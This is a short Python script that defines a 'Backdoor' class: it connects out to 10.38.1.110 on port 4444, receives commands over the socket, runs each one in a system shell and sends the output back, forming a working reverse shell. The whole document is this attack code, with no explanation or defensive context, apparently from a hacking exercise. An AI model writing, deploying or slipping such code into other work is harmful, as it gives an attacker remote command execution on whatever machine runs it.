import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)
    
    def run(self):
        while True:
            command = self.connection.recv(1024).decode()
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)

        connection.close()

my_backdoor = Backdoor('10.38.1.110', 4444)
my_backdoor.run()